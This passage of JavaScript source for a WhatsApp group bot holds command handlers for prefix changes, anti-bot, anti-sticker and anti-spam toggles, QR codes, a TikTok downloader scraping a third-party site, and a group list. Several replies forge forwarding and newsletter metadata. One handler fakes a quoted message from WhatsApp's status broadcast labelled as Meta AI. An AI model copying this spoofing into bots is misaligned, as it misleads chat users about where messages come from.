        caption: `╭┄┄『𝐒𝐄𝐓𝐏𝐑𝐄𝐅𝐈𝐗』\n│  ⚙️ *𝐁𝐎𝐓 𝐏𝐑𝐄𝐅𝐈𝐗*\n│📑 ʙᴏᴛ ɴᴀᴍᴇ : ʏᴏᴜ ᴡᴇʙ ʙᴏᴛ\n│🌟ᴄʀᴇᴀᴛᴏʀ : ʏᴏᴜ ᴛᴇᴄʜx ᴏғᴄ\n│📌 *ᴄᴜʀʀᴇɴᴛ ᴘʀᴇғɪx:* ${currentPrefix}\n│📋 *ᴀᴠᴀɪʟᴀʙʟᴇ ᴘʀᴇғɪx:* ${prefixList}\n│💡 * to use:* ${currentPrefix}setprefix .\n│ ${currentPrefix}setprefix !\n│ ${currentPrefix}setprefix 🇺🇸\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363426341519710@newsletter',
            newsletterName: config.BOT_NAME,
            serverMessageId: 143
          }
        }
      }, { quoted: msg });
      break;
    }

    if (!validPrefixes.includes(newPrefix)) {
      await socket.sendMessage(sender, {
        text: `❌ ᴘʀᴇғɪx *${newPrefix}* ɪɴᴠᴀʟɪᴅ!\n\n✅ ᴀʟʟᴏᴡᴇᴅ ᴘʀᴇғɪxᴇs:\n${validPrefixes.map(p => `▸ ${p}`).join('\n')}`
      }, { quoted: msg });
      break;
    }

    // Sove prefix nan config
    const cfg2 = await loadSessionConfigFromMongo(sanitized) || {};
    cfg2.PREFIX = newPrefix;
    await setUserConfigInMongo(sanitized, cfg2);
    config.PREFIX = newPrefix;

    await socket.sendMessage(sender, {
      image: { url: 'https://i.postimg.cc/HkHw5qSN/file-0000000031f871fdbb71e79065924655.png' },
      caption: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│  ✅ *𝐏𝐑𝐄𝐅𝐈𝐗 𝐂𝐇𝐀𝐍𝐆𝐄 𝐒𝐔𝐂𝐂𝐄𝐒𝐅𝐔𝐋𝐋𝐘*\n│ 🔄 ɴᴇᴡ ᴘʀᴇғɪx: *${newPrefix}*\n│ 💡 ɴᴏᴡ ᴛʏᴘᴇ: *${newPrefix}menu*\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363426341519710@newsletter',
          newsletterName: config.BOT_NAME,
          serverMessageId: 143
        }
      }
    }, { quoted: msg });

  } catch (e) {
    console.error('[PREFIX ERROR]', e);
    await socket.sendMessage(sender, { text: `❌ Erè: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// ANTIBOT — Aktive/Dezaktive pwoteksyon kont lòt bot
// ============================================================
case 'antibot': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(sender, { text: '❌ Komand sa sèlman nan group!' }, { quoted: msg });
      break;
    }
    const sub = args[0]?.toLowerCase();
    if (sub === 'on') {
      global.antibotGroups.add(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🔇 *𝐀𝐍𝐓𝐈𝐁𝐎𝐓 ON*\n│ ✅ Antibot activé !\n│ 🤖 Seul *${config.BOT_NAME}* est autorisé.\n│ ⚠️ Les autres bots seront retirés.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`,
        contextInfo: { forwardingScore: 999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363426341519710@newsletter', newsletterName: config.BOT_NAME, serverMessageId: 143 } }
      }, { quoted: msg });
    } else if (sub === 'off') {
      global.antibotGroups.delete(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🔓 *𝐀𝐍𝐓𝐈𝐁𝐎𝐓 OFF*\n│ ✅ Antibot désactivé.\n│ 👥 Tous les bots peuvent envoyer.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`,
        contextInfo: { forwardingScore: 999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363426341519710@newsletter', newsletterName: config.BOT_NAME, serverMessageId: 143 } }
      }, { quoted: msg });
    } else {
      const status = global.antibotGroups.has(from) ? '🟢 *ON*' : '🔴 *OFF*';
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🔇 *𝐀𝐍𝐓𝐈𝐁𝐎𝐓*\n│ 📊 *Status:* ${status}\n│ 📌 *Usage:*\n│▸ .antibot on — activer\n│▸ .antibot off — désactiver\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    }
  } catch (e) {
    console.error('[ANTIBOT CMD ERROR]', e);
    await socket.sendMessage(sender, { text: `❌ Erè: ${e.message}` }, { quoted: msg });
  }
  break;
}


// ===============================================================
// CASE: antisticker — ANTI STICKER GROUP
// ===============================================================
case 'antisticker': {
  try {
    const isGroup = from.endsWith('@g.us');
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum  = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    // Vérification admin (groupe uniquement), owner toujours autorisé
    if (isGroup) {
      const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
      const isAdmin = groupAdminsJid.includes(senderJid) || senderNum === ownerNum;
      if (!isAdmin) return await socket.sendMessage(from, { text: '❌ Admins seulement !' }, { quoted: msg });
    } else {
      // En privé, seul l'owner peut activer
      if (senderNum !== ownerNum) {
        return await socket.sendMessage(from, { text: '❌ Owner seulement en privé !' }, { quoted: msg });
      }
    }

    const sub = args[0]?.toLowerCase();
    if (!global.antistickerGroups) global.antistickerGroups = new Set();

    if (sub === 'on') {
      global.antistickerGroups.add(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🎴 *𝐀𝐍𝐓𝐈𝐒𝐓𝐈𝐂𝐊𝐄𝐑 ON*\n│ ✅ Stickers interdits ici !\n│ ⚠️ Les contrevenants seront retirés.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    } else if (sub === 'off') {
      global.antistickerGroups.delete(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🎴 *𝐀𝐍𝐓𝐈𝐒𝐓𝐈𝐂𝐊𝐄𝐑 OFF*\n│ ✅ Les stickers sont maintenant autorisés.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    } else {
      const status = global.antistickerGroups?.has(from) ? '🟢 *ON*' : '🔴 *OFF*';
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🎴 *𝐀𝐍𝐓𝐈𝐒𝐓𝐈𝐂𝐊𝐄𝐑*\n│ 📊 Status: ${status}\n│ 📌 Usage:\n│▸ .antisticker on\n│▸ .antisticker off\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    }
  } catch (e) {
    console.error('[ANTISTICKER CMD ERROR]', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message}` }, { quoted: msg });
  }
  break;
}

case 'antispam': {
  try {
    if (!from.endsWith('@g.us')) {
      return await socket.sendMessage(from, { text: '❌ Groupe seulement !' }, { quoted: msg });
    }
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum  = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
    const isAdmin   = groupAdminsJid.includes(senderJid) || senderNum === ownerNum;
    if (!isAdmin) return await socket.sendMessage(from, { text: '❌ Admins seulement !' }, { quoted: msg });

    const sub = args[0]?.toLowerCase();
    if (!global.antispamGroups) global.antispamGroups = new Set();

    if (sub === 'on') {
      global.antispamGroups.add(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🛡️ *𝐀𝐍𝐓𝐈𝐒𝐏𝐀𝐌 ON*\n│ ✅ Anti-spam activé dans ce groupe !\n│ ⚠️ Les spammeurs seront retirés.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    } else if (sub === 'off') {
      global.antispamGroups.delete(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🛡️ *𝐀𝐍𝐓𝐈𝐒𝐏𝐀𝐌 OFF*\n│ ✅ Anti-spam désactivé.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    } else {
      const status = global.antispamGroups?.has(from) ? '🟢 *ON*' : '🔴 *OFF*';
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🛡️ *𝐀𝐍𝐓𝐈𝐒𝐏𝐀𝐌*\n│ 📊 Status: ${status}\n│ 📌 Usage:\n│▸ .antispam on\n│▸ .antispam off\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    }
  } catch (e) {
    console.error('[ANTISPAM CMD ERROR]', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message}` }, { quoted: msg });
  }
  break;
}


// ===============================================================
// CASE: antidemote — PROTÈGE LES ADMINS CONTRE LES RÉTROGRADATIONS
// ===============================================================
case 'antidemote': {
  try {
    if (!from.endsWith('@g.us')) {
      return await socket.sendMessage(from, { text: '❌ Groupe seulement !' }, { quoted: msg });
    }
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum  = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
    const isAdmin   = groupAdminsJid.includes(senderJid) || senderNum === ownerNum;
    if (!isAdmin) return await socket.sendMessage(from, { text: '❌ Admins seulement !' }, { quoted: msg });

    const sub = args[0]?.toLowerCase();
    if (!global.antidemoteGroups) global.antidemoteGroups = new Set();

    if (sub === 'on') {
      global.antidemoteGroups.add(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🛡️ *𝐀𝐍𝐓𝐈𝐃𝐄𝐌𝐎𝐓𝐄 ON*\n│ ✅ Protection active!\n│ ⚠️ Quiconque rétrograde un admin sera retiré.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    } else if (sub === 'off') {
      global.antidemoteGroups.delete(from);
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🛡️ *𝐀𝐍𝐓𝐈𝐃𝐄𝐌𝐎𝐓𝐄 OFF*\n│ ✅ Protection désactivée.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    } else {
      const status = global.antidemoteGroups?.has(from) ? '🟢 *ON*' : '🔴 *OFF*';
      await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│ 🛡️ *𝐀𝐍𝐓𝐈𝐃𝐄𝐌𝐎𝐓𝐄*\n│ 📊 Status: ${status}\n│ 📌 Usage:\n│▸ .antidemote on — activer\n│▸ .antidemote off — désactiver\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    }
  } catch (e) {
    console.error('[ANTIDEMOTE CMD ERROR]', e);
    await socket.sendMessage(from, { text: `❌ Erreur: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ===============================================================
// CASE: qrcode — GÉNÉRER UN QR CODE
// ===============================================================
case 'qrcode':
case 'qr': {
  try {
    react('🔲');
    const text = args.join(' ').trim();
    if (!text) {
      react('❌');
      return await socket.sendMessage(from, {
        text: `╭┈┈『 🔲 QR CODE 』\n│\n│ ❌ DONNE DU TEXTE OU UNE URL\n│\n│ 📌 EXEMPLE :\n│ .qr https://github.com\n│ .qr Bonjour le monde!\n│\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    }

    await socket.sendMessage(from, {
      text: `╭┈┈『 ⏳ GÉNÉRATION QR 』\n│\n│ 🔲 Création du QR code...\n│\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    // Utilise l'API publique qr-server.com (sans clé)
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(text)}&color=000000&bgcolor=ffffff&margin=20&format=png`;

    const response = await axios.get(qrUrl, { responseType: 'arraybuffer', timeout: 15000 });
    const buffer = Buffer.from(response.data);

    react('✅');
    await socket.sendMessage(from, {
      image: buffer,
      caption: `╭┈┈『 🔲 QR CODE 』\n│\n│ ✅ QR généré avec succès!\n│ 📝 Contenu: ${text.length > 50 ? text.substring(0,50)+'...' : text}\n│\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n> ${config.BOT_FOOTER}`
    }, { quoted: msg });

  } catch (e) {
    react('❌');
    console.error('[QRCODE ERROR]', e);
    await socket.sendMessage(from, { text: `❌ Erreur QR Code: ${e.message}` }, { quoted: msg });
  }
  break;
}



case 'owner': {
  try {

    // ===== REACT (emoji du menu 1) =====
    await socket.sendMessage(sender, {
      react: {
        text: "💥",
        key: msg.key
      }
    });

    const ownerNumber = "447781508638";
    const ownerName = "ʏᴏᴜ ƚɛƈɦ᥊ ☺︎ 🧔🏻‍♂️💚";

    // ===== VCARD =====
    const vcard =
      'BEGIN:VCARD\n' +
      'VERSION:3.0\n' +
      'FN:' + ownerName + '\n' +
      'ORG:ʏᴏᴜ ᴍᴅ ᴅᴇᴠᴇʟᴏᴘᴇʀ;\n' +
      'TEL;type=CELL;type=VOICE;waid=' + ownerNumber + ':+' + ownerNumber + '\n' +
      'END:VCARD';

    await socket.sendMessage(sender, {
      contacts: {
        displayName: ownerName,
        contacts: [{ vcard }]
      }
    }, { quoted: msg });

    // ===== TEXT =====
    const ownerMsg = `
👋 *hello !*

╭┄┄◆ developer info ◆
│ ◈ name : ${ownerName}
│ ◈ role : lead developer
│ ◈ bot : you md v1
│ ◈ status : online ⚡
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ

> feel free to contact the owner for any help or bugs regarding you md 🍂
`.trim();

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: `https://wa.me/${ownerNumber}`,
        buttonText: {
          displayText: "ᴄʜᴀᴛ ᴡɪᴛʜ ᴏᴡɴᴇʀ"
        },
        type: 1
      },
      {
        buttonId: ".menu",
        buttonText: {
          displayText: "🌟 ᴍᴇɴᴜ"
        },
        type: 1
      }
    ];

    // ===== SEND =====
    await socket.sendMessage(sender, {
      image: {
        url: "https://files.catbox.moe/0lsjly.png"
      },
      caption: ownerMsg,
      footer: "ʏᴏᴜ ᴡᴇʙ ʙᴏᴛ • ᴍᴏᴅ",
      buttons: buttons,
      headerType: 4
    }, { quoted: msg });

  } catch (e) {
    console.error("OWNER ERROR:", e);

    await socket.sendMessage(sender, {
      text: "❌ Une erreur est survenue lors de l'envoi des infos owner."
    }, { quoted: msg });
  }
}
break;


case 'tiktok':
case 'tt': {
  try {
    // Définir jid et sender
    const jid = msg.key.remoteJid;
    const sender = msg.key.participant || msg.key.remoteJid;
    
    // headers adaptés au site savett.cc
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Origin': 'https://savett.cc',
      'Referer': 'https://savett.cc/en1/download',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    };

    // helpers encapsulés
    async function getCsrfAndCookie() {
      const res = await axios.get('https://savett.cc/en1/download', { 
        headers,
        timeout: 10000 
      });
      const csrf = res.data.match(/name="csrf_token" value="([^"]+)"/)?.[1] || null;
      const cookie = (res.headers['set-cookie'] || [])
        .map(v => v.split(';')[0])
        .join('; ');
      return { csrf, cookie };
    }

    async function postDl(url, csrf, cookie) {
      const body = `csrf_token=${encodeURIComponent(csrf)}&url=${encodeURIComponent(url)}`;
      const res = await axios.post('https://savett.cc/en1/download', body, {
        headers: { ...headers, Cookie: cookie },
        timeout: 30000
      });
      return res.data;
    }

    function parseSavettHtml(html) {
      const $ = cheerio.load(html);
      const stats = [];
      $('#video-info .my-1 span').each((_, el) => stats.push($(el).text().trim()));

      const data = {
        username: $('#video-info h3').first().text().trim() || null,
        views: stats[0] || null,
        likes: stats[1] || null,
        bookmarks: stats[2] || null,
        comments: stats[3] || null,
        shares: stats[4] || null,
        duration: $('#video-info p.text-muted').first().text().replace(/Duration:/i, '').trim() || null,
        type: null,
        downloads: { nowm: [], wm: [] },
        mp3: [],
        slides: []
      };

      const slides = $('.carousel-item[data-data]');
      if (slides.length) {
        data.type = 'photo';
        slides.each((_, el) => {
          try {
            const json = JSON.parse($(el).attr('data-data').replace(/&quot;/g, '"'));
            if (Array.isArray(json.URL)) {
              json.URL.forEach(url => data.slides.push({ index: data.slides.length + 1, url }));
            }
          } catch {}
        });
        return data;
      }

      data.type = 'video';
      $('#formatselect option').each((_, el) => {
        const label = $(el).text().toLowerCase();
        const raw = $(el).attr('value');
        if (!raw) return;
        try {
          const json = JSON.parse(raw.replace(/&quot;/g, '"'));
          if (!json.URL) return;
          if (label.includes('mp4') && !label.includes('watermark')) data.downloads.nowm.push(...json.URL);
          if (label.includes('watermark')) data.downloads.wm.push(...json.URL);
          if (label.includes('mp3')) data.mp3.push(...json.URL);
        } catch {}
      });

      return data;
    }

    async function savett(url) {
      const { csrf, cookie } = await getCsrfAndCookie();
      if (!csrf) throw new Error('CSRF token not found');
      const html = await postDl(url, csrf, cookie);
      return parseSavettHtml(html);
    }

    // helper pour télécharger une URL en Buffer avec limite de taille
    async function fetchBufferFromUrl(u) {
      try {
        // Vérifier l'espace disque disponible
        const stats = await fs.promises.stat('/').catch(() => ({ size: 0 }));
        const freeSpace = stats.size || 1024 * 1024 * 1024; // fallback 1GB
        
        // Limiter à 50MB par fichier
        const response = await axios({
          method: 'GET',
          url: u,
          responseType: 'stream',
          timeout: 30000,
          maxContentLength: 50 * 1024 * 1024, // 50MB max
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        const chunks = [];
        let totalSize = 0;
        
        for await (const chunk of response.data) {
          chunks.push(chunk);
          totalSize += chunk.length;
          
          // Vérifier la taille totale
          if (totalSize > 50 * 1024 * 1024) {
            throw new Error('Fichier trop volumineux (>50MB)');
          }
        }
        
        return Buffer.concat(chunks);
      } catch (e) {
        console.error('[TIKTOK] fetchBufferFromUrl error', e?.message || e);
        return null;
      }
    }

    // validation URL
    const url = (args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
      await socket.sendMessage(sender, { 
        text: '❗ Usage: .tiktok <url>\nExample: .tiktok https://vt.tiktok.com/xxxxx' 
      }, { quoted: msg });
      break;
    }

    // Réaction d'attente
    await socket.sendMessage(jid, { react: { text: "⏳", key: msg.key } });
    await socket.sendMessage(sender, { 
      text: '🔎 Recherche et téléchargement en cours, merci de patienter...' 
    }, { quoted: msg });

    // exécution principale
    const info = await savett(url);

    if (!info) {
      await socket.sendMessage(sender, { 
        text: '❌ Impossible de récupérer les informations pour ce lien.' 
      }, { quoted: msg });
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
      break;
    }

    // résumé
    const summary = [
      `│. ˚˖𓍢ִ໋👤 ᴀᴜᴛᴇᴜʀ: ${info.username || 'inconnu'}`,
      `│. ˚˖𓍢ִ໋🎞️ Type: ${info.type || 'inconnu'}`,
      `│. ˚˖𓍢ִ໋🖼️ sʟɪᴅᴇs: ${info.slides?.length || 0}`,
      `│. ˚˖𓍢ִ໋🎵 ᴀᴜᴅɪᴏ: ${info.mp3?.length || 0}`,
      `│. ˚˖𓍢ִ໋📥 ᴠɪᴅᴇ́ᴏs (ɴᴏ ᴡᴀᴛᴇʀᴍᴀʀᴋ): ${info.downloads.nowm?.length || 0}`,
      `│. ˚˖𓍢ִ໋💧 ᴠɪᴅᴇ́ᴏs (ᴡᴀᴛᴇʀᴍᴀʀᴋ): ${info.downloads.wm?.length || 0}`
    ];
    if (info.duration) summary.push(`│. ˚˖𓍢ִ໋⏱️ ᴅᴜʀᴇ́ᴇ: ${info.duration}\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`);
    
    await socket.sendMessage(sender, { 
      text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n✅ 𝐓𝐈𝐊𝐓𝐎𝐊 𝐑𝐄𝐒𝐔𝐋𝐓:\n${summary.join('\n')}` 
    }, { quoted: msg });

    // Fonction pour envoyer avec gestion d'erreur
    async function sendMediaWithRetry(mediaType, buffer, caption, maxRetries = 2) {
      for (let i = 0; i < maxRetries; i++) {
        try {
          const messageOptions = { quoted: msg };
          if (mediaType === 'video') {
            await socket.sendMessage(jid, { video: buffer, caption, mimetype: 'video/mp4' }, messageOptions);
          } else if (mediaType === 'audio') {
            await socket.sendMessage(jid, { audio: buffer, mimetype: 'audio/mpeg', fileName: 'audio.mp3' }, messageOptions);
          } else if (mediaType === 'image') {
            await socket.sendMessage(jid, { image: buffer, caption }, messageOptions);
          }
          return true;
        } catch (sendErr) {
          console.error(`[TIKTOK] Send attempt ${i + 1} failed:`, sendErr.message);
          if (i === maxRetries - 1) throw sendErr;
          await new Promise(r => setTimeout(r, 1000));
        }
      }
      return false;
    }

    let mediaSent = false;

    // priorité: envoyer les vidéos sans watermark si disponibles
    if (Array.isArray(info.downloads.nowm) && info.downloads.nowm.length) {
      const toSend = info.downloads.nowm.slice(0, 1); // limiter à 1 pour éviter les problèmes
      for (const v of toSend) {
        const buf = await fetchBufferFromUrl(v);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger la vidéo` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('video', buf, `🎥 TikTok — ${info.username || 'Auteur'}`);
        if (sent) mediaSent = true;
      }
    }

    // sinon envoyer vidéos watermark si présentes
    if (!mediaSent && Array.isArray(info.downloads.wm) && info.downloads.wm.length) {
      const toSend = info.downloads.wm.slice(0, 1);
      for (const v of toSend) {
        const buf = await fetchBufferFromUrl(v);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger la vidéo` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('video', buf, `🎥 TikTok (watermark) — ${info.username || 'Auteur'}`);
        if (sent) mediaSent = true;
      }
    }

    // si mp3 disponible
    if (!mediaSent && Array.isArray(info.mp3) && info.mp3.length) {
      for (const a of info.mp3.slice(0, 1)) {
        const buf = await fetchBufferFromUrl(a);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger l'audio` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('audio', buf, '');
        if (sent) mediaSent = true;
      }
    }

    // slides (photos)
    if (!mediaSent && Array.isArray(info.slides) && info.slides.length) {
      for (const s of info.slides.slice(0, 3)) {
        const buf = await fetchBufferFromUrl(s.url);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger l'image` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('image', buf, `🖼️ Slide ${s.index} — ${info.username || 'Auteur'}`);
        if (sent) mediaSent = true;
      }
    }

    // Réaction finale
    if (mediaSent) {
      await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });
    } else {
      await socket.sendMessage(sender, { text: '❌ Aucun média exploitable trouvé pour ce lien.' }, { quoted: msg });
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
    }

  } catch (err) {
    console.error('[TIKTOK COMMAND ERROR]', err);
    
    // Définir jid et sender pour le catch
    const jid = msg?.key?.remoteJid;
    const sender = msg?.key?.participant || msg?.key?.remoteJid;
    
    try { 
      await socket.sendMessage(jid, { react: { text: '❌', key: msg.key } }); 
    } catch(e){}
    
    let errorMessage = err.message || 'Erreur inconnue';
    if (errorMessage.includes('ENOSPC')) {
      errorMessage = 'Espace disque insuffisant pour traiter ce média. Essayez avec un fichier plus petit.';
    } else if (errorMessage.includes('timeout')) {
      errorMessage = 'Délai d\'attente dépassé. Le serveur met trop de temps à répondre.';
    }
    
    await socket.sendMessage(sender, { 
      text: `❌ Erreur lors du traitement: ${errorMessage}` 
    }, { quoted: msg });
  }
  break;
}

case 'gjid':
case 'groupjid':
case 'grouplist': {
  try {

    await socket.sendMessage(sender, { 
      react: { text: "📝", key: msg.key } 
    });

    await socket.sendMessage(sender, { 
      text: "📝 ᴀᴄᴄᴇssɪɴɢ ɢʀᴏᴜᴘ ʟɪsᴛ..." 
    }, { quoted: msg });

    const groups = await socket.groupFetchAllParticipating();
    const groupArray = Object.values(groups);

    groupArray.sort((a, b) => a.creation - b.creation);

    if (groupArray.length === 0) {
      return await socket.sendMessage(sender, { 
        text: "❌ ɴᴏ ɢʀᴏᴜᴘ ғᴏᴜɴᴅ" 
      }, { quoted: msg });
    }

    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓";

    const groupsPerPage = 10;
    const totalPages = Math.ceil(groupArray.length / groupsPerPage);

    for (let page = 0; page < totalPages; page++) {

      const start = page * groupsPerPage;
      const end = start + groupsPerPage;
      const pageGroups = groupArray.slice(start, end);

      const groupList = pageGroups.map((group, index) => {
        const globalIndex = start + index + 1;
        const memberCount = group.participants ? group.participants.length : 'N/A';
        const subject = group.subject || 'uɴɴᴀᴍᴇᴅ ɢʀᴏᴜᴘ';
        const jid = group.id;

        return `│. • ${globalIndex}. ${subject}
│. • ᴍᴇᴍʙᴇʀs : ${memberCount}
│. • ᴊɪᴅ : ${jid}`;
      }).join('\n\n');

      const textMsg = `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│✵ ɢʀᴏᴜᴘ ʟɪsᴛ ᴍᴏᴅᴜʟᴇ
│✵ ᴘᴀɢᴇ : ${page + 1}/${totalPages}
│✵ ᴛᴏᴛᴀʟ : ${groupArray.length}
│✵ ᴏᴡɴᴇʀ ʙᴏᴛ : ${botName}
│✵ 
│✵ ${groupList}
╰┄ мα∂є ву уσυ тє¢нχ σƒ¢ 🇺🇸
`;

      await socket.sendMessage(sender, {
        text: textMsg
      });

      if (page < totalPages - 1) {
        await delay(1000);
      }
    }

  } catch (err) {
    console.error('GJID command error:', err);
    await socket.sendMessage(sender, { 
      text: "❌ ᴇʀʀᴏʀ ᴡʜɪʟᴇ ғᴇᴛᴄʜɪɴɢ ɢʀᴏᴜᴘs"
    }, { quoted: msg });
  }
  break;
}






case 'mediafire':
case 'mf':
case 'mfdl': {
    try {
        const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();
        const url = text.split(" ")[1];

        const sanitized = (number || '').replace(/[^0-9]/g, '');
        let cfg = await loadUserConfigFromMongo(sanitized) || {};
        let botName = cfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

        const shonux = {
            key: {
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: false,
                id: "META_AI_MEDIAFIRE"
            },
            message: {
                contactMessage: {
                    displayName: botName,
                    vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
                }
            }
        };

        if (!url) {
            return await socket.sendMessage(sender, {
                text: `╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍsɢ : ɪɴᴠᴀʟɪᴅ ʟɪɧᴋ
│. • ᴜsᴀɢᴇ : .ᴍᴇᴅɪᴀғɪʀᴇ <ʟɪɴᴋ>
╰┄『 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 』
`
            }, { quoted: shonux });
        }

